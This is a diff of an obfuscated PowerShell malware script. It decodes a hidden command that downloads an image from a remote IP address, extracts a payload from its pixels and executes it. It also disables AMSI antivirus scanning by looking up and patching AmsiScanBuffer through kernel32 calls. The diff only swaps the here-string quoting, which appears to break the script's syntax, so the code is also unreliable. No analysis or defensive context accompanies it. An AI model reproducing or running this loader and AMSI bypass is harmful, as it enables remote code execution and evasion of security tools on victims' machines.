@@ -3,9 +3,9 @@ c2FsIGEgTmV3LU!@#$%^&@#$%^@#$%^@#$%^&*(9iamVjdDtBZGQtV!@#$%^&@#$%^@#$%^@#$%^&*(H
 zExMC40Mi4xMzUuMjA4OjgwLzQ1Ni5qcGciKSk7JG89YSBCeXRlW10gMzUzMjgwOygwLi4xODMpfCV7Zm9yZWFjaCgkeCBpbigwLi4xOTE5KSl7JHA9JGcuR2V0UGl4ZWwoJHgsJF8pOyR
 vWyRfKjE5MjArJHhdPShbbWF0aF06OkZsb29yKCgkcC5CLW!@#$%^&@#$%^@#$%^@#$%^&*(JhbmQxNSkqMTYpLWJvcigkcC5HIC1iYW5kIDE1KSl9!@#$%^&@#$%^@#$%^@#$%^&*(fTtJRVgoW1N5c3RlbS5UZXh0Lk!@#$%^&@#$%^@#$%^@#$%^&*(VuY29kaW5nXTo6QVNDSUkuR2V0U3
 RyaW5nKCRvWz!@#$%^&@#$%^@#$%^@#$%^&*(AuLjM1MjU3MF0pKQ==
-"@.Replace('!@#$%^&@#$%^@#$%^@#$%^&*(','')
+".Replace('!@#$%^&@#$%^@#$%^@#$%^&*(','')
 $Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($reb))
-$dcvrj = @"
+$dcvrj = "
 using System;
 using System.Runtime.InteropServices;
 public class dcvrj {
@@ -16,7 +16,7 @@ public class dcvrj {
     [DllImport("kernel32")]
     public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr grtylw, uint flNewProtect, out uint lpflOldProtect);
 }
-"@
+"
 Add-Type $dcvrj
 $xymgyyn = [dcvrj]::LoadLibrary("$(('ámsí'+'.dll').NoRmalIZe([chaR]([ByTE]0x46)+[chAr](111)+[Char]([ByTE]0x72)+[chAr]([byte]0x6d)+[cHaR]([Byte]0x44)) -replace [cHAR](92*1/1)+[ChAr](112)+[CHaR](123)+[chAr](77)+[ChAr]([ByTe]0x6e)+[cHaR]([bYTe]0x7d))")
 $ppruhu = [dcvrj]::GetProcAddress($xymgyyn, "$([CHar]([BYte]0x41)+[cHAr]([Byte]0x6d)+[chAr](115+85-85)+[Char](105)+[ChaR](83+56-56)+[ChAr](99+13-13)+[CHar](97+59-59)+[ChAR]([byTE]0x6e)+[chAR]([BYTe]0x42)+[Char]([bYte]0x75)+[cHAR](44+58)+[ChAr]([BYte]0x66)+[CHaR]([bYTe]0x65)+[CHAR](114*92/92))")
